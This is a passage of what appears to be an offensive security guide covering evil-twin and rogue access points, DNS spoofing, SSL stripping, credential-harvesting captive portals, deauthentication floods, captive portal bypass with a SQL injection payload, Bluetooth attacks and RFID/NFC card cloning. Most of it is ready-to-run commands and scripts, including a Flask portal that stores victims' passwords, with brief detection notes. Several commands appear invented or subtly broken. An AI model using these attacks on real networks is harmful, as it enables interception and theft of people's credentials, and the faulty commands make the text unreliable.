[Inference] Deauthentication combined with rogue AP presentation near clients enables high-probability association to attacker infrastructure, particularly when rogue signal exceeds legitimate AP strength.

**DNS Spoofing and MITM Attacks**

Intercept and manipulate client traffic:

```bash
# Enable IP forwarding for transparent bridging
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure DHCP on rogue AP
cat > dhcpd.conf << 'EOF'
subnet 192.168.100.0 netmask 255.255.255.0 {
    range 192.168.100.50 192.168.100.200;
    option domain-name-servers 192.168.100.1;
    option routers 192.168.100.1;
    default-lease-time 600;
    max-lease-time 7200;
}
EOF

dnsmasq -C dhcpd.conf -d

# DNS spoofing via dnsmasq
# Add to dhcpd.conf:
# address=/facebook.com/192.168.100.1
# address=/google.com/192.168.100.1
# Redirects all DNS queries to attacker IP

# MITM with iptables
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443

# HTTP/HTTPS interception proxy
mitmproxy -p 8080 --mode transparent

# Monitor intercepted traffic
tcpdump -i wlan0mon -w evil_traffic.pcap
```

[Inference] MITM positioning enables complete traffic manipulationâ€”credential theft, malware injection, content modificationâ€”dependent only on attacker technical capability and target's acceptance of self-signed certificates.

**Credential Harvesting Through Rogue AP**

Capture client credentials:

```bash
# 1. Fake login portal (HTTP interception)
# Redirect all HTTP traffic to attacker-controlled page

cat > fake_login.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Authentication</title></head>
<body>
<h2>Connect to WiFi</h2>
<form method="POST" action="/login">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Connect">
</form>
</body>
</html>
EOF

python3 -m http.server 80

# 2. Capture HTTP POST data
tcpdump -i wlan0mon -A "tcp port 80 and (((ip[2:2] - ((ip[0]&xf)<<2)) - ((tcp[12]&xf0)>>2)) != 0)" | grep -oE "user=.*&pass=.*" | head -20

# 3. Email credential harvesting
# Intercept IMAP/SMTP login attempts
tcpdump -i wlan0mon -A "tcp port 143 or tcp port 25" | grep -iE "login|auth|user|pass"

# 4. HTTPS interception (self-signed certificate)
# mitmproxy intercepts HTTPS if client accepts invalid cert
# Many clients auto-accept on captive portals

mitmproxy -p 8443 --mode transparent --cert /path/to/selfsigned.pem

# Monitor flow data for credentials
mitmproxy interactive interface shows all intercepted HTTP/HTTPS requests
```

[Inference] Credential harvesting success depends on client behavioral exploitationâ€”users attempting to access familiar services (email, social media) may submit credentials to rogue portals expecting authentication.

**Evil Twin with WPA2 Impersonation**

Establish WPA2-protected rogue AP requiring password entry:

```bash
# Create WPA2-protected evil twin
cat > evil_wpa2.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=CorporateWiFi
channel=6
hw_mode=g

# WPA2 configuration
wpa=2
wpa_passphrase=WeakPassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# Enable debugging
debug=1
EOF

hostapd -dd evil_wpa2.conf

# Clients associating with rogue AP must know WPA2 password
# If password publicly known or easily guessed: automatic association
# If password unknown: captive portal redirect after association

# Hybrid approach:
# - Open network with SSID cloning
# - Prompt for "password" to continue
# - Actually requesting credentials

cat > password_portal.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Password Required</title></head>
<body>
<h3>Enter WiFi Password</h3>
<form method="POST" action="/auth">
    <input type="password" name="password" placeholder="WiFi Password">
    <input type="submit" value="Connect">
</form>
</body>
</html>
EOF
```

[Inference] WPA2-protected rogue APs create authentic-appearing networks with transparent encryption, reducing client suspicion while enabling MITM attacks through complete credential possession.

**Evil Twin Detection and Avoidance**

Identify and prevent rogue AP compromise:

```bash
# Detection methods:

# 1. BSSID monitoring
# Legitimate AP BSSIDs rarely change
# Sudden BSSID change indicates rogue AP

# 2. Signal strength analysis
# Compare RSSI (signal strength) consistency
# Rapid fluctuation indicates multiple APs

# 3. Certificate analysis
# Check HTTPS certificate validity
# Self-signed or mismatched domain = rogue AP
openssl s_client -connect suspicious_ap:443 -showcerts

# 4. HTTPS-Everywhere enforcement
# Prevents HTTP downgrade attacks
# Browser extensions ensure encryption

# 5. VPN usage
# Encrypts all traffic regardless of AP compromise
# Masks DNS queries and HTTP traffic

# 6. MAC filtering
# Whitelist known legitimate AP BSSIDs
# Reject connections to unknown BSSIDs

# 7. Client behavior analysis
# Monitor for unexpected network changes
# Alert on new network connection attempts
```

[Inference] Evil Twin detection relies on behavioral analysis and certificate validation rather than wireless-specific mechanisms, requiring user awareness and endpoint security controls.

**Evil Twin With Captive Portal**

Implement sophisticated credential capture:

```bash
# Create advanced captive portal

cat > portal_server.py << 'EOF'
from flask import Flask, render_template, request, redirect
import sqlite3

app = Flask(__name__)

@app.route('/')
def portal():
    # Redirect all traffic to portal
    return render_template('portal.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Store credentials
    conn = sqlite3.connect('credentials.db')
    conn.execute('INSERT INTO credentials VALUES (?, ?)', (username, password))
    conn.commit()
    
    # Perform RADIUS authentication check (legitimate or fake)
    if authenticate(username, password):
        return redirect('http://www.google.com')  # "Success" page
    else:
        return render_template('portal.html', error='Invalid credentials')

def authenticate(user, password):
    # Connect to real RADIUS server or fake acceptance
    return True  # All credentials accepted

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF

python3 portal_server.py

# Configure iptables to redirect all HTTP to portal
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80

# HTTPS redirection (requires certificate)
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443
```

[Inference] Advanced captive portals provide credential validation feedback and internet access simulation, increasing user legitimacy perception and credential harvesting effectiveness.

**Evil Twin Distribution and Scale**

Expand rogue AP attacks across large areas:

```bash
# Multiple simultaneous evil twins
# Each targeting different SSIDs or channels

# Distribution script
for ssid in $(cat target_ssids.txt); do
    for channel in {1,6,11}; do
        # Create AP config dynamically
        cat > /tmp/evil_$channel.conf << EOF
interface=wlan${channel}mon
ssid=$ssid
channel=$channel
# ... additional config
EOF
        
        # Launch AP
        hostapd -dd /tmp/evil_$channel.conf &
    done
done

# Monitor all APs simultaneously
for interface in wlan0mon wlan1mon wlan2mon; do
    tcpdump -i $interface -w /tmp/evil_$interface.pcap &
done

# Aggregate captured credentials
cat /tmp/evil_*.pcap | tcpdump -r - -A "tcp port 80" | grep -oE "user=.*&pass=.*"
```

[Inference] Distributed evil twin attacks enable large-scale credential harvesting from multiple networks simultaneously, requiring adequate wireless hardware (multiple adapters) and computational resources.

**Evil Twin Network Segmentation Bypass**

Use rogue AP for internal network access:

```bash
# Scenario: Corporate network with guest WiFi isolation
# Guest WiFi isolated from internal resources

# Attack procedure:

# 1. Clone internal SSID (CorporateWiFi)
# 2. Create rogue AP with higher signal strength
# 3. Clients associate with rogue instead of internal

# 4. Rogue AP bridges to attacker's infrastructure
# Attacker establishes MITM position

# 5. Clients believe connected to internal network
# Actually traffic flows through attacker

# 6. Attacker pivots to internal resources
# Lateral movement from guest to corporate segment

# Mitigation: VPN enforcement
# Corporate devices required to use VPN
# Encryption prevents MITM attacks

# Detection: Network monitoring
# Unusual internal traffic patterns
# Clients accessing restricted resources from guest segment
```

[Inference] Evil Twin network segmentation bypass relies on client trust exploitation and MITM positioning rather than wireless protocol vulnerabilities, enabling [Inference] lateral movement when users assume network safety based on SSID alone.

---

## Rogue Access Point Setup

A rogue access point (AP) masquerades as a legitimate wireless network, intercepting traffic from clients that connect to it. This attack is effective in environments where users connect to networks with familiar SSIDs or in scenarios with weak SSID broadcasting security.

**Hardware Requirements and Selection**

Rogue AP deployment requires compatible wireless hardware:

```bash
# Check wireless adapter capabilities
iwconfig
iw phy
iw list | grep -A 20 "Supported interface modes"

# Verify monitor mode support
airmon-ng check
iwconfig wlan0 mode monitor

# Verify AP mode support
iw phy phy0 info | grep "AP"
```

Essential hardware characteristics:

- Monitor mode support (packet capture and injection)
- AP (access point) mode support
- Sufficient transmit power for coverage area
- Dual-band capability (2.4GHz and 5GHz) for advanced scenarios

**Monitor Mode Activation**

Enable wireless adapter in monitor mode:

```bash
# Identify wireless interface
iwconfig

# Disable network management interference
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# Switch to monitor mode
sudo airmon-ng start wlan0
# Creates mon0 interface

# Manual monitor mode activation
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify monitor mode
iwconfig wlan0 | grep Mode
```

**Hostapd Configuration for Rogue AP**

Configure hostapd to broadcast rogue access point:

```bash
cat > /etc/hostapd/hostapd.conf << 'EOF'
# Basic AP configuration
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1

# WPA2 encryption (optional for open network attack)
wpa=2
wpa_passphrase=DefaultPassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP

# Beacon interval
beacon_int=100

# Allow stations
max_num_sta=100

# Fragment threshold
fragm_threshold=2346

# RTS threshold
rts_threshold=2347
EOF

# Launch hostapd
sudo hostapd /etc/hostapd/hostapd.conf -dd
```

**DHCP Server Configuration**

Configure dnsmasq to provide DHCP and DNS services:

```bash
cat > /etc/dnsmasq.conf << 'EOF'
# DHCP configuration
interface=wlan0
dhcp-range=192.168.100.10,192.168.100.250,12h
dhcp-option=option:router,192.168.100.1
dhcp-option=option:dns-server,192.168.100.1

# DNS configuration
address=/#/192.168.100.1
listen-address=192.168.100.1

# Log queries
log-queries
log-facility=/var/log/dnsmasq.log
EOF

# Start dnsmasq
sudo dnsmasq -C /etc/dnsmasq.conf
```

**IP Address and Network Configuration**

Configure attacking system IP addressing:

```bash
# Assign IP to AP interface
sudo ip addr add 192.168.100.1/24 dev wlan0
sudo ip link set wlan0 up

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure iptables for traffic interception
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -j ACCEPT
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.100.1
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination 192.168.100.1
```

**SSL Strip and HTTPS Downgrade**

Intercept HTTPS traffic by stripping SSL/TLS:

```bash
# Install SSLStrip
sudo apt-get install sslstrip

# Configure iptables to redirect HTTPS to SSLStrip
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Launch SSLStrip
sslstrip -l 8080 -w /var/log/sslstrip.log

# Monitor captured credentials
tail -f /var/log/sslstrip.log
```

**mitmproxy for Traffic Inspection**

Deploy mitmproxy to capture and modify HTTP/HTTPS traffic:

```bash
# Install mitmproxy
sudo apt-get install mitmproxy

# Configure iptables for mitmproxy interception
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8443

# Launch mitmproxy
mitmproxy -p 8080 --mode transparent --showhost

# Or use mitmdump for scripting
mitmdump -p 8080 --mode transparent --showhost -w captured_traffic.mitm
```

**Automated Rogue AP Deployment**

Script-based rogue AP setup for efficiency:

```bash
#!/bin/bash
# rogue_ap_setup.sh

INTERFACE="wlan0"
SSID="CorporateGuest"
IP_ADDR="192.168.100.1"
DHCP_RANGE="192.168.100.10,192.168.100.250"

echo "[*] Setting up rogue AP..."

# Stop conflicting services
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# Enable monitor mode
sudo airmon-ng start $INTERFACE

# Configure IP
sudo ip addr add $IP_ADDR/24 dev $INTERFACE
sudo ip link set $INTERFACE up

# Start dnsmasq
sudo dnsmasq -C /etc/dnsmasq.conf

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure iptables
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i $INTERFACE -j ACCEPT
sudo iptables -A FORWARD -i eth0 -j ACCEPT
sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j DNAT --to-destination $IP_ADDR
sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j DNAT --to-destination $IP_ADDR

# Launch hostapd
sudo hostapd /etc/hostapd/hostapd.conf -d &

# Launch mitmproxy
mitmproxy -p 8080 --mode transparent --showhost -w captured_traffic.mitm &

echo "[+] Rogue AP deployed on $SSID"
```

**Evil Twin Attack (SSID Cloning)**

Create AP with identical SSID to legitimate network:

```bash
# Scan for target network BSSID and channel
sudo airodump-ng wlan0 | grep "TargetSSID"

# Configure hostapd with matching BSSID
cat > /etc/hostapd/hostapd_twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetSSID
hwmode=g
channel=6
bssid=AA:BB:CC:DD:EE:FF
# Match target BSSID

# Open network
auth_algs=1
wpa=0
EOF

# Deploy evil twin
sudo hostapd /etc/hostapd/hostapd_twin.conf
```

[Inference] In environments with multiple APs on same SSID, clients may connect to strongest signal. Rogue AP with higher transmit power attracts clients from legitimate network.

**De-authentication Attack (Forced Roaming)**

Force clients to disconnect from legitimate AP and connect to rogue:

```bash
# Identify target network
sudo airodump-ng wlan0 -c 6 -w capture

# Launch de-authentication flood
sudo aireplay-ng -0 0 -a [TARGET_BSSID] wlan0
# -0: de-authentication packets
# 0: continuous flood
# -a: target BSSID

# Targeted de-auth (specific client)
sudo aireplay-ng -0 10 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0
```

**Traffic Analysis and Credential Harvesting**

Monitor and extract credentials from captured traffic:

```bash
# Analyze captured mitmproxy traffic
mitmproxy -r captured_traffic.mitm

# Extract credentials from PCAP
sudo tcpdump -r traffic.pcap -i any | grep -E "password|login|user"

# Parse HTTP POST data
sudo tcpdump -r traffic.pcap -A -n | grep -E "POST|password|username"

# Extract from mitmproxy flow
mitmdump -r captured_traffic.mitm -q "~q & ~t image"
```

**Detection and Countermeasures**

[Inference] Rogue AP detection relies on identifying suspicious network characteristics. Defenders can identify rogue APs through:

- Signal strength analysis (unusually strong signal near entry points)
- Certificate inspection (self-signed certificates)
- MAC address comparison (known legitimate MAC prefixes)
- BSSID stability monitoring (legitimate APs have consistent BSSIDs)

## Captive Portal Bypass

Captive portals present authentication pages to unauthenticated users before granting internet access. Bypass techniques vary depending on portal implementation and detection mechanisms.

**Portal Detection and Analysis**

Identify captive portal characteristics:

```bash
# Detect portal presence via HTTP request
curl -v http://192.168.1.1:8080/

# Check for HTTP redirect
curl -L -v http://example.com | head -20

# Analyze redirect target
curl -i http://captive.apple.com/hotspot-detect.html

# Check HTTP status codes
curl -s -o /dev/null -w "%{http_code}" http://captive.apple.com/hotspot-detect.html
# 200 = internet connectivity
# 302 = captive portal redirect
```

**Portal Page Analysis**

Extract portal page content for vulnerability assessment:

```bash
# Download portal page
wget -O portal.html http://192.168.1.1:8080/

# Analyze HTML for hidden fields
grep -E "input type|hidden|name=" portal.html

# Extract authentication parameters
strings portal.html | grep -E "username|password|token|session"

# Analyze JavaScript for client-side validation
strings portal.html | grep -E "javascript|function|var " | head -20
```

**HTTP Header Manipulation**

Bypass portal detection through modified headers:

```bash
# Mimic legitimate client detection
curl -H "User-Agent: CaptiveNetworkSupport/1.0 CFNetwork/537.36" \
     -H "X-Apple-WISPD-Version: 1.0" \
     http://192.168.1.1/

# Spoof device type
curl -H "User-Agent: iPhone OS 15_0" \
     -H "Accept: */*" \
     http://192.168.1.1/

# Inject bypass headers
curl -H "X-Forwarded-For: 8.8.8.8" \
     -H "X-Original-URL: http://example.com" \
     http://192.168.1.1/
```

**Direct HTTP Request Bypass**

Execute requests bypassing portal interception:

```bash
# Connect directly to external IP (if portal only filters DNS)
curl -v http://8.8.8.8/

# Use alternative protocols
# HTTPS may bypass HTTP-only portals
curl -k https://192.168.1.1/

# HTTP/2 or HTTP/3 bypass (if portal only filters HTTP/1.1)
curl -v --http2 http://192.168.1.1/
```

**DNS-Based Bypass**

Circumvent portal through DNS resolution manipulation:

```bash
# Query external DNS directly
nslookup example.com 8.8.8.8

# Use DNS-over-HTTPS
curl -H "accept: application/dns-json" \
     "https://1.1.1.1/dns-query?name=example.com&type=A"

# Configure system DNS to bypass portal
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
echo "nameserver 1.1.1.1" | sudo tee -a /etc/resolv.conf
```

**MAC Address Spoofing**

Register with portal using different MAC, then change to bypass:

```bash
# Identify current MAC
ip link show wlan0

# Spoof MAC address
sudo ip link set wlan0 down
sudo ip link set wlan0 address 00:11:22:33:44:55
sudo ip link set wlan0 up

# Disconnect from portal-protected AP
sudo nmcli device disconnect wlan0

# Connect with new MAC
sudo nmcli device connect wlan0

# Request new DHCP lease
sudo dhclient -r wlan0
sudo dhclient wlan0
```

**Portal Authentication Bypass via Direct Access**

Directly access portal backend or authentication endpoints:

```bash
# Common portal paths
curl http://192.168.1.1/login.php
curl http://192.168.1.1/auth.php
curl http://192.168.1.1/portal/login

# Attempt SQL injection in login
curl -d "username=admin' OR '1'='1&password=admin" \
     http://192.168.1.1/login.php

# Check for unauthenticated access to admin panel
curl http://192.168.1.1/admin/
curl http://192.168.1.1/admin/users
```

**Session Token Extraction and Reuse**

Capture and reuse valid session tokens:

```bash
# Capture authentication request
sudo tcpdump -i wlan0 -A -s 0 'tcp port 80' | grep -E "GET|POST|Cookie"

# Extract session cookie from authenticated user
grep -i "set-cookie" captured_response.txt

# Reuse session token
curl -H "Cookie: SESSIONID=extracted_token_value" \
     http://192.168.1.1/
```

**Browser Automation for Portal Bypass**

Use browser automation to complete portal authentication:

```python
#!/usr/bin/env python3
# portal_bypass.py
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Create headless browser instance
options = webdriver.ChromeOptions()
options.add_argument("--headless")
driver = webdriver.Chrome(options=options)

try:
    # Navigate to portal
    driver.get("http://192.168.1.1:8080/")
    
    # Fill login form
    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")
    
    username_field.send_keys("admin")
    password_field.send_keys("password")
    
    # Submit form
    submit_button = driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
    submit_button.click()
    
    time.sleep(3)
    
    # Verify authentication
    if "Welcome" in driver.page_source or "logout" in driver.page_source.lower():
        print("[+] Authentication successful")
        
        # Extract cookies
        cookies = driver.get_cookies()
        for cookie in cookies:
            print(f"[+] Cookie: {cookie['name']}={cookie['value']}")
    
finally:
    driver.quit()
```

**IPv6 Bypass**

Exploit IPv6 connectivity when portal only filters IPv4:

```bash
# Check IPv6 connectivity
ping6 2001:4860:4860::8888

# Connect via IPv6
curl -6 http://[2001:4860:4860::8888]/

# If local IPv6 available
ip -6 route add default via fe80::1 dev wlan0
curl -6 http://example.com/
```

**Proxy and VPN Bypass Chains**

Chain multiple bypass techniques:

```bash
# Through captured portal gateway, establish SSH tunnel
ssh -D 1080 user@external_server

# Route traffic through tunnel
curl -x socks5://127.0.0.1:1080 http://example.com/

# Or establish VPN through captured portal
openvpn --config openvpn.conf
```

## Bluetooth Enumeration

Bluetooth wireless technology presents a separate attack surface. Enumeration identifies discoverable devices, services, and vulnerabilities.

**Bluetooth Device Discovery**

Scan for Bluetooth devices in range:

```bash
# Verify Bluetooth adapter
hciconfig
hcitool dev

# Reset Bluetooth adapter
sudo hciconfig hci0 reset

# Passive scan (doesn't alert devices)
sudo hcitool scan

# Active scan with timing
sudo timeout 60 hcitool scan --flush

# Continuous scanning
while true; do
    sudo hcitool scan
    sleep 5
done
```

**Device Information Extraction**

Query detailed Bluetooth device information:

```bash
# Get device name
hcitool name [DEVICE_MAC]

# Get device info
hcitool info [DEVICE_MAC]

# Check device class/type
hcitool class [DEVICE_MAC]

# Get RSSI (signal strength)
hcitool rssi [DEVICE_MAC]

# Get link quality
hcitool lq [DEVICE_MAC]
```

**Service Discovery Protocol (SDP) Enumeration**

Identify services offered by Bluetooth devices:

```bash
# Query SDP database
sudo sdptool browse [DEVICE_MAC]

# Search for specific service type
sudo sdptool search --uuid [UUID] [DEVICE_MAC]

# Common UUIDs:
# 0000110e-0000-1000-8000-00805f9b34fb (Audio Sink)
# 0000111f-0000-1000-8000-00805f9b34fb (Headset Audio Gateway)
# 00001105-0000-1000-8000-00805f9b34fb (OBEXObjectPush)
```

**BlueZ Tool Suite Enumeration**

Use BlueZ utilities for comprehensive Bluetooth discovery:

```bash
# Interactive Bluetooth controller
bluetoothctl

# From bluetoothctl:
# scan on
# devices
# info [MAC]
# show

# Command-line equivalents
sudo bluetoothctl power on
sudo bluetoothctl scan on &
sleep 30
sudo bluetoothctl devices
sudo bluetoothctl info [MAC]
```

**Bluetooth Adapter Capabilities**

Identify supported Bluetooth versions and features:

```bash
# Get adapter capabilities
hcitool cmd 0x04 0x03
# Returns supported commands

# Get local version
hcitool cmd 0x04 0x01

# Get device features
hcitool cmd 0x04 0x04

# Parse Bluetooth version
hciconfig hci0 | grep -i "version"
```

**MAC Address Analysis**

Determine device types from MAC addresses:

```bash
# Extract manufacturer from MAC
sudo hcitool cmd 0x04 0x09 | xxd

# Cross-reference manufacturer code
# First 3 octets (OUI) identify manufacturer
# Example: Apple = 4C:xx:xx

# Query manufacturer database
echo "4C" | awk '{print "Apple"}' # Known mappings
```

**Bluetooth Link Key Extraction** [Unverified]

Attempt to extract previously paired device link keys:

```bash
# Check stored link keys
sudo cat /var/lib/bluetooth/[ADAPTER_MAC]/linkkeys

# BlueZ configuration
sudo cat /etc/bluetooth/main.conf

# Query HCI for stored keys
hcitool cmd 0x01 0x13
# Return list of link keys
```

[Inference] Link key extraction requires filesystem access or HCI command support; availability depends on Bluetooth implementation.

**Extended Inquiry Response (EIR) Analysis**

Parse EIR data from scan results:

```bash
# Capture EIR data
sudo hcitool -i hci0 scan

# Parse extended information
# Contains device name, TX power, manufacturer data

#!/bin/bash
# Extract EIR data from device
DEVICE_MAC=$1
hcitool info $DEVICE_MAC | grep -i "EIR"
```

**Bluetooth Low Energy (BLE) Enumeration**

Discover BLE devices and characteristics:

```bash
# Scan for BLE devices
sudo hcitool -i hci0 lescan

# Get BLE device information
sudo bluetoothctl scan on

# Connect to BLE device
sudo bluetoothctl connect [MAC]

# List GATT characteristics
sudo bluetoothctl gatt.list-attributes [DEVICE_PATH]

# Read characteristic
sudo bluetoothctl gatt.read [CHARACTERISTIC_PATH]
```

**Bluetooth Packet Capture**

Capture Bluetooth traffic for analysis:

```bash
# Create virtual Bluetooth monitor
sudo btmon

# Capture to file
sudo btmon --write=bluetooth_capture.btsnoop

# Analyze with Wireshark
wireshark bluetooth_capture.btsnoop

# Monitor specific device
sudo hcidump -i hci0 -X
```

## Bluetooth Exploitation

Bluetooth vulnerabilities enable unauthorized pairing, service access, and data interception.

**Bluetooth Pairing Attacks**

Exploit weak pairing mechanisms:

```bash
# Just Works pairing (no authentication)
# Device automatically accepts pairing

# Pin Entry pairing (weak PINs)
# Common defaults: 0000, 1111, 1234, 9999

# Out-of-Band (OOB) pairing
# Requires prior key exchange outside Bluetooth
```

**Unbonded Service Access**

Access services without device pairing:

```bash
# Connect to unsecured service
sudo rfcomm connect /dev/rfcomm0 [DEVICE_MAC] [CHANNEL]

# Attempt to communicate
echo "command" > /dev/rfcomm0
cat /dev/rfcomm0
```

**GATT Characteristic Exploitation**

Write malicious data to Bluetooth characteristics:

```bash
# Connect to BLE device
sudo bluetoothctl connect [MAC]

# List characteristics
sudo bluetoothctl gatt.list-attributes

# Write to characteristic
sudo bluetoothctl gatt.write [PATH] [VALUE]

# Example: Set device name
sudo bluetoothctl gatt.write /org/bluez/hci0/dev_[MAC]/service0000/char0001 "Hacked"
```

**Bluetooth Man-in-the-Middle (MITM)**

Intercept and modify Bluetooth communications:

```bash
# Using bettercap for Bluetooth MITM
sudo bettercap -iface wlan0 -caplet http-ui -eval "
set ble.recon on
ble.recon on
ble.show
"

# Create rogue Bluetooth device
# (Technical setup varies by implementation)
```

**Bluetooth Device Impersonation**

Spoof legitimate Bluetooth device:

```bash
# Identify target device MAC
TARGET_MAC="[LEGITIMATE_DEVICE_MAC]"

# Change local device MAC to match
sudo hciconfig hci0 down
sudo hciconfig hci0 reset
# Note: MAC spoofing via HCI is device-dependent

# Advertise same GATT services
sudo bluetoothctl advertise on
```

**BLE Advertising Injection**

Inject malicious BLE advertisements:

```bash
# Using hcitool to set advertising data
sudo hcitool -i hci0 cmd 0x08 0x0008 \
    1e \
    02 01 06 \
    1b ff 4c 00 02 15 \
    [UUID] \
    [MAJOR:2 bytes] \
    [MINOR:2 bytes] \
    [TX_POWER] \

# This injects iBeacon-format advertisement
```

**Service Credential Extraction**

Extract credentials from Bluetooth services:

```bash
# Connect to device
sudo rfcomm connect /dev/rfcomm0 [MAC] [CHANNEL]

# Interact with service
cat /dev/rfcomm0

# Send known commands
echo "AT+COPS?" > /dev/rfcomm0

# Capture responses containing credentials
nc [DEVICE_IP] [PORT] | tee -a captured_data.txt
```

**Bluetooth Protocol Reverse Engineering**

Analyze unknown Bluetooth protocols:

```bash
# Capture and analyze traffic
sudo btmon --write=protocol.btsnoop

# Analyze in Wireshark
# Look for patterns:
# - Initialization sequences
# - Command format
# - Response structures

# Common Bluetooth profiles:
# AT commands (hands-free)
# OBEX (object exchange)
# RFCOMM (serial emulation)
```

**BLE Peripheral Mode Exploitation**

Create malicious BLE peripheral:

```bash
# Using BlueZ GATT Server
cat > gatt_service.py << 'EOF'
import dbus
import dbus.service
import dbus.mainloop.glib
from gi.repository import GLib

class GATTService(dbus.service.Object):
    PATH_BASE = '/org/bluez/hci0/app'
    
    def __init__(self, bus, index):
        self.path = self.PATH_BASE + '/service' + str(index)
        dbus.service.Object.__init__(self, bus, self.path)
        self.props = {
            'UUID': '12345678-1234-5678-1234-56789abcdef0',
            'Primary': True,
            'Characteristics': []
        }

# Initialize and start service
EOF

python3 gatt_service.py
```

**Bluetooth Classic Audio Interception**

Capture Bluetooth audio streams:

```bash
# Enable audio snooping
sudo hcitool -i hci0 cmd 0x3f 0x0ca
# Enable enhanced snooping

# Capture with btmon
sudo btmon --write=audio.btsnoop

# Decode audio from captured packets
# Tools: SBC (Subband Codec) decoder for A2DP profile
```

**Bluetooth Classic PIN/Passkey Attacks**

Exploit weak PIN/passkey authentication:

```bash
# Common PINs to attempt
PINS=("0000" "1111" "1234" "4321" "9999" "0001")

# Automated PIN brute force (device-specific)
for pin in "${PINS[@]}"; do
    sudo hcitool cc [DEVICE_MAC]
    # Simulate PIN entry
    sudo hcitool pin [DEVICE_MAC] "$pin"
done
```

## RFID/NFC Analysis

Radio Frequency Identification (RFID) and Near-Field Communication (NFC) technologies enable contactless data exchange over short distances.

**RFID Frequency Identification**

Determine RFID frequency bands in use:

```bash
# Common RFID frequencies:
# 125 kHz (Low Frequency, LF): Access control, animal tracking
# 13.56 MHz (High Frequency, HF): Smartcards, NFC
# 860-960 MHz (Ultra High Frequency, UHF): Inventory, supply chain

# Identify frequency with signal analysis
# Using Software Defined Radio (SDR) or spectrum analyzer
```

**NFC Device Detection**

Identify NFC-capable devices and nearby targets:

```bash
# Check if system supports NFC
ls /dev/nfc*

# List NFC devices
sudo nfc-list

# Scan for NFC targets
sudo nfc-poll

# Continuous scanning
while true; do
    sudo nfc-poll
    sleep 2
done
```

**NFC Tag Reading**

Extract data from NFC tags:

```bash
# Read NFC tag data
sudo nfc-read

# Get detailed tag information
sudo nfc-list -v

# Dump tag contents
sudo nfcpy
# Then: clf = ContactlessFrontend('usb')
#       target = clf.poll()
#       print(target.dump())

# Using libnfc command-line tools
nfc-mfclassic r a dump.mfd
# Read Mifare Classic tag to file

nfc-mfclassic w a dump.mfd data.mfd
# Write to Mifare Classic tag
```

**NFC Type Detection**

Classify NFC tag types:

```bash
# Type 1 (Topaz): 96 bytes, no authentication
# Type 2 (Mifare Ultralight): 64 bytes, limited security
# Type 3 (FeliCa): 2KB, cryptographic authentication
# Type 4 (Mifare Desfire): ISO 14443A, AES encryption
# Type 5 (ISO 15693): Larger memory, longer range

# Detect tag type during scan
sudo nfc-poll
# Output includes: SENS_RES, SEL_RES, NFCID values
```

**RFID Passive Tag Enumeration**

Discover passive RFID tags without power:

```bash
# RFID reader setup
# Proxmark3 device commonly used for RFID enumeration

# Using Proxmark3:
proxmark3

# Commands:
# hw status
# lf search  (Low Frequency search)
# hf search  (High Frequency search)
# lf t55xx detect  (T5577 tag detection)
# hf mfu info  (Mifare Ultralight info)
```

**EM4100 RFID Cloning**

Clone 125kHz EM4100 format RFID tags:

```bash
# Read EM4100 tag
sudo proxmark3
# hw status
# lf em4x05 info

# Capture EM4100 ID
lf em 410x read
# Outputs format like: EM410x Prox ID: [ID_DATA]

# Clone to writable tag (T55xx)
lf em 410x clone --id [EM_ID]
```

**Mifare Classic Tag Analysis**

Enumerate and exploit Mifare Classic cards:

```bash
# List Mifare information
sudo nfc-list -v

# Using mfcuk to find default keys
mfcuk -C -R 0:A -v 3

# Read Mifare sectors
sudo nfcpy
# clf = ContactlessFrontend('usb')
# target = clf.poll()
# target.read_ndef()

# Write to Mifare using libnfc
nfc-mfclassic w a dump.mfd backup.mfd
```

**NFC Forum Record Parsing**

Extract and analyze NDEF (NFC Data Exchange Format) records:

```bash
# NDEF record types:
# TNF (Type Name Format)
# Type: URI, Text, Media, Absolute URI, External, etc.

# Read NDEF records
sudo nfcpy
# target.read_ndef()

# Parse URI records
# Common: http://, https://, mailto:, etc.

